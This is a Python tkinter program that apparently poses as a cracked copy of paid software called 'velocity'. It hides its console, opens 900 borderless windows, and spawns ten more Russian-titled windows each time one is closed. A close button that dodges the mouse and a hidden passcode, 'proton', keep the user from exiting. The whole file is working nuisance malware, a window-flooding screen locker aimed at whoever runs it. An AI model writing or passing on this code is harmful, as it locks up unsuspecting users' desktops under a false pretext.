# -*- coding: utf-8 -*-
import tkinter as tk
import random
import threading
import sys
import ctypes

if sys.platform == 'win32':
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)
    except:
        pass

BACKGROUND_COLOR = "#808080"
PANEL_COLOR = "#242933"
TEXT_COLOR = "#e6e9ef"
ICON_COLOR = "#596273"
ICONS = ("*", "+", "#", "@", "%", "&", "~")
PASSCODE = "proton"

def spawn_windows(count=10, is_plague=True):
    def on_close(window):
        if is_plague:
            threading.Thread(target=lambda: spawn_windows(10, True), daemon=True).start()
        window.destroy()
    
    for _ in range(count):
        window = tk.Toplevel()
        window.title("ТЫ НЕ ЗАКРОЕШЬ!")
        window.geometry("350x150")
        window.resizable(False, False)
        window.configure(bg=BACKGROUND_COLOR)
        window.protocol("WM_DELETE_WINDOW", lambda w=window: on_close(w))
        window.overrideredirect(False)
        
        label = tk.Label(
            window,
            text="Нажми крестик → ещё 10 окон",
            font=("Arial", 14),
            bg=BACKGROUND_COLOR,
            fg=TEXT_COLOR
        )
        label.pack(pady=20)
        
        btn = tk.Button(
            window,
            text="Или сюда (тоже спавнит)",
            command=lambda: threading.Thread(target=lambda: spawn_windows(10, True), daemon=True).start(),
            bg=PANEL_COLOR,
            fg=TEXT_COLOR,
            activebackground="#303846",
            activeforeground=TEXT_COLOR,
            relief="flat"
        )
        btn.pack(pady=10)

def open_text_windows():
    root = tk.Tk()
    root.title("Window Controls")
    root.geometry("320x150")
    root.resizable(False, False)
    root.configure(bg=BACKGROUND_COLOR)

    def close_all_windows():
        root.destroy()

    passcode_window = tk.Toplevel(root)
    passcode_window.title("Passcode")
    passcode_window.geometry("260x145")
    passcode_window.resizable(False, False)
    passcode_window.configure(bg=BACKGROUND_COLOR)
    passcode_window.overrideredirect(True)

    tk.Label(
        passcode_window,
        text="Enter passcode:",
        bg=BACKGROUND_COLOR,
        fg=TEXT_COLOR
    ).pack(pady=(12, 4))
    
    passcode_entry = tk.Entry(
        passcode_window,
        show="*",
        width=24,
        bg=PANEL_COLOR,
        fg=TEXT_COLOR,
        insertbackground=TEXT_COLOR
    )
    passcode_entry.pack()
    
    status_label = tk.Label(passcode_window, text="", bg=BACKGROUND_COLOR, fg="#ff7b72")
    status_label.pack()
    
    next_window_number = 100

    def create_text_window():
        nonlocal next_window_number
        window = tk.Toplevel(root)
        window.title(f"Text Window {next_window_number}")
        window.geometry("500x300")
        window.configure(bg=BACKGROUND_COLOR)
        window.overrideredirect(True)
        window.protocol("WM_DELETE_WINDOW", lambda: spawn_windows(10, True))
        
        icon_label = tk.Label(
            window,
            text=random.choice(ICONS),
            font=("Segoe UI", 72, "bold"),
            bg=BACKGROUND_COLOR,
            fg=ICON_COLOR
        )
        icon_label.place(relx=0.86, rely=0.72, anchor="center")
        
        text_box = tk.Text(
            window,
            wrap="word",
            undo=True,
            bg=PANEL_COLOR,
            fg=TEXT_COLOR,
            insertbackground=TEXT_COLOR,
            relief="flat"
        )
        text_box.pack(fill="both", expand=True, padx=(8, 82), pady=8)
        text_box.insert("1.0", "velocity paid version cracked")
        next_window_number += 1

    def submit_passcode():
        if passcode_entry.get() == PASSCODE:
            close_all_windows()
            return
        status_label.config(text="Incorrect passcode")
        passcode_entry.delete(0, tk.END)
        create_text_window()

    def keep_passcode_window_open():
        passcode_window.deiconify()
        passcode_window.lift()
        passcode_window.focus_force()

    root.protocol("WM_DELETE_WINDOW", submit_passcode)
    passcode_window.protocol("WM_DELETE_WINDOW", keep_passcode_window_open)

    button_positions = [(20, 20), (150, 20), (80, 85), (210, 85)]
    position_index = 0
    
    close_button = tk.Button(
        root,
        text="Close All",
        command=submit_passcode,
        width=12,
        height=2,
        bg=PANEL_COLOR,
        fg=TEXT_COLOR,
        activebackground="#303846",
        activeforeground=TEXT_COLOR,
        relief="flat"
    )
    close_button.place(x=button_positions[0][0], y=button_positions[0][1])

    def move_close_button(_event):
        nonlocal position_index
        position_index = (position_index + 1) % len(button_positions)
        button_x, button_y = button_positions[position_index]
        close_button.place(x=button_x, y=button_y)

    close_button.bind("<Enter>", move_close_button)

    tk.Button(
        passcode_window,
        text="Submit",
        command=submit_passcode,
        bg=PANEL_COLOR,
        fg=TEXT_COLOR,
        activebackground="#303846",
        activeforeground=TEXT_COLOR,
        relief="flat"
    ).pack(pady=8)

    for _ in range(900):
        create_text_window()
    
    spawn_windows(10, is_plague=True)
    
    root.mainloop()

if __name__ == "__main__":
    open_text_windows()